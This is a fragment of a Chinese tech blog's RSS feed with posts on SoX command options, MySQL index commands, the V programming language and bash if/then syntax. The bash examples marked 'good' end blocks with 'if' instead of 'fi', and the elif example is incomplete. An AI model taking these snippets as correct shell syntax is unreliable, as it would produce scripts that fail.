&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--play-rate-arg ARG      Default `rate&amp;#39; argument for auto-resample with `play&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--plot gnuplot|octave    Generate script to plot response of filter effect
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q, &lt;span style=&#34;color:#75715e&#34;&gt;--no-show-progress   Run in quiet mode; opposite of -S
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--replay-gain track|album|off  Default: off (sox, rec), track (play)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;R                       Use &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt; random numbers (same &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;each&lt;/span&gt; run &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; SoX)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;S, &lt;span style=&#34;color:#75715e&#34;&gt;--show-progress      Display progress while processing audio data
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--single-threaded        Disable parallel effects channels processing
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--temp DIRECTORY         Specify the directory to use for temporary files
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;T, &lt;span style=&#34;color:#75715e&#34;&gt;--combine multiply   Multiply samples of corresponding channels from all
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                         &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt; files (&lt;span style=&#34;color:#66d9ef&#34;&gt;instead&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; concatenating)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--version                Display version number of SoX and exit
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;V[&lt;span style=&#34;color:#66d9ef&#34;&gt;LEVEL&lt;/span&gt;]                &lt;span style=&#34;color:#66d9ef&#34;&gt;Increment&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;set&lt;/span&gt; verbosity &lt;span style=&#34;color:#66d9ef&#34;&gt;level&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); levels:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: failure messages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: warnings
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: details &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; processing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: increasing levels &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; debug messages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FORMAT &lt;span style=&#34;color:#66d9ef&#34;&gt;OPTIONS&lt;/span&gt; (fopts):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Input&lt;/span&gt; file format &lt;span style=&#34;color:#66d9ef&#34;&gt;options&lt;/span&gt; need &lt;span style=&#34;color:#66d9ef&#34;&gt;only&lt;/span&gt; be supplied &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; files that &lt;span style=&#34;color:#66d9ef&#34;&gt;are&lt;/span&gt; headerless.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Output&lt;/span&gt; files will have the same format &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; the &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt; file &lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; possible &lt;span style=&#34;color:#66d9ef&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;overriden &lt;span style=&#34;color:#66d9ef&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;any&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; various means &lt;span style=&#34;color:#66d9ef&#34;&gt;including&lt;/span&gt; providing &lt;span style=&#34;color:#66d9ef&#34;&gt;output&lt;/span&gt; format &lt;span style=&#34;color:#66d9ef&#34;&gt;options&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;v&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--volume FACTOR       Input file volume adjustment factor (real number)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--ignore-length          Ignore input file length given in header; read to EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--type FILETYPE       File type of audio
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--encoding ENCODING   Set encoding (ENCODING may be one of signed-integer,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                         unsigned&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;integer, floating&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;point, mu&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;law, a&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;law,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                         ima&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;adpcm, ms&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;adpcm, gsm&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;full&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rate)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--bits BITS           Encoded sample size in bits
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--reverse-nibbles     Encoded nibble-order
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;X&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--reverse-bits        Encoded bit-order
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--endian little|big|swap Encoded byte-order; swap means opposite to default
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;L&lt;span style=&#34;color:#f92672&#34;&gt;/-&lt;/span&gt;B&lt;span style=&#34;color:#f92672&#34;&gt;/-&lt;/span&gt;x                 Short &lt;span style=&#34;color:#66d9ef&#34;&gt;options&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the above
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--channels CHANNELS   Number of channels of audio data; e.g. 2 = stereo
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--rate RATE           Sample rate of audio
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;C&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--compression FACTOR  Compression factor for output format
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--add-comment TEXT       Append output file comment
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--comment TEXT           Specify comment text for the output file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--comment-file FILENAME  File containing comment text for the output file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--no-glob                Don&amp;#39;t `glob&amp;#39; wildcard match the following filename
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AUDIO FILE FORMATS: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;svx aif aifc aiff aiffc al amb amr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nb amr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;wb anb au avr awb caf cdda cdr cvs cvsd cvu dat dvms f32 f4 f64 f8 fap flac fssd gsm gsrt hcom htk ima ircam la lpc lpc10 lu mat mat4 mat5 maud mp2 mp3 nist ogg paf prc pvf raw s1 s16 s2 s24 s3 s32 s4 s8 sb sd2 sds sf sl sln smp snd sndfile sndr sndt sou sox sph sw txw u1 u16 u2 u24 u3 u32 u4 u8 ub ul uw vms voc vorbis vox w64 wav wavpcm wv wve xa xi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PLAYLIST FORMATS: m3u pls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AUDIO DEVICE DRIVERS: alsa
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EFFECTS: allpass band bandpass bandreject bass bend biquad chorus channels compand contrast dcshift deemph delay dither divide&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; downsample earwax echo echos equalizer fade fir firfit&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flanger gain highpass hilbert &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; ladspa loudness lowpass mcompand mixer&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; noiseprof noisered norm oops &lt;span style=&#34;color:#66d9ef&#34;&gt;output&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; overdrive &lt;span style=&#34;color:#66d9ef&#34;&gt;pad&lt;/span&gt; phaser pitch rate remix repeat reverb reverse riaa silence sinc spectrogram speed splice stat stats stretch swap synth tempo treble tremolo &lt;span style=&#34;color:#66d9ef&#34;&gt;trim&lt;/span&gt; upsample vad vol
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Deprecated effect    &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Experimental effect    &lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; LibSoX&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;only&lt;/span&gt; effect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EFFECT &lt;span style=&#34;color:#66d9ef&#34;&gt;OPTIONS&lt;/span&gt; (effopts): effect dependent; see &lt;span style=&#34;color:#75715e&#34;&gt;--help-effect
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://sox.sourceforge.net/sox.html#OPTIONS&#34;&gt;http://sox.sourceforge.net/sox.html#OPTIONS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>MySql索引</title>
      <link>https://wdd.js.org/posts/2019/10/bs9nax/</link>
      <pubDate>Tue, 22 Oct 2019 10:36:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/bs9nax/</guid>
      <description>&lt;p&gt;prd是表名，agent是表中的一个字段，index_agent是索引名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;create&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt; index_agent &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt; prd(agent) &lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;创建索引&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; prd &lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;显示表上有哪些索引&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;drop&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;index&lt;/span&gt; index_agent &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt; prd &lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;删除索引&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;创建索引的好处是查询速度有极大的提成，坏处是更新记录时，有可能也会更新索引，从而降低性能。&lt;/p&gt;
&lt;p&gt;所以索引比较适合那种只写入，或者查询，但是一般不会更新的数据。&lt;/p&gt;</description>
    </item>
    <item>
      <title>关于v语言: 越是漂亮的语言，越会骗人</title>
      <link>https://wdd.js.org/posts/2019/10/awgyhh/</link>
      <pubDate>Mon, 21 Oct 2019 21:15:29 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/awgyhh/</guid>
      <description>&lt;p&gt;今天逛github trending, 发现榜首有个项目，叫做v语言。&lt;a href=&#34;https://github.com/vlang/v&#34;&gt;https://github.com/vlang/v&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看了介绍，说这个语言非常牛X，几乎囊括了所有语言的长处。性能、编译耗时、内存使用都是碾压其他语言。&lt;/p&gt;
&lt;p&gt;但是，要记住张无忌娘说过的一句话：&lt;strong&gt;越是漂亮的女人，越会骗人。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每一门语言都是由特定的使用场景，从而则决定了该语言在该场景下解决问题的能力。&lt;/p&gt;
&lt;p&gt;不谈使用场景，而仅仅强调优点，往往是耍流氓。&lt;/p&gt;
&lt;p&gt;你看JavaScript一出生，就是各种问题，但是在浏览器里，JavaScript就是能够一统天下，无人能够掩盖其锋芒。&lt;/p&gt;</description>
    </item>
    <item>
      <title>流程控制</title>
      <link>https://wdd.js.org/shell/flow-control/</link>
      <pubDate>Fri, 18 Oct 2019 13:06:58 +0800</pubDate>
      <guid>https://wdd.js.org/shell/flow-control/</guid>
      <description>&lt;h1 id=&#34;if-then&#34;&gt;if then&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// good
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// good
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// error: if和then写成一行时，条件后必须加上分号
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 在&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;中，内侧前后都需要加上空格
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-d public&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;if-elif-then&#34;&gt;if elif then&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;循环&#34;&gt;循环&lt;/h1&gt;
&lt;h1 id=&#34;switch&#34;&gt;switch&lt;/h1&gt;
&lt;h1 id=&#34;常用例子&#34;&gt;常用例子&lt;/h1&gt;
&lt;h2 id=&#34;判断目录是否存在&#34;&gt;判断目录是否存在&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -d public &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public exist&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;判断文件是否存在&#34;&gt;判断文件是否存在&lt;/h2&gt;</description>
    </item>
    <item>
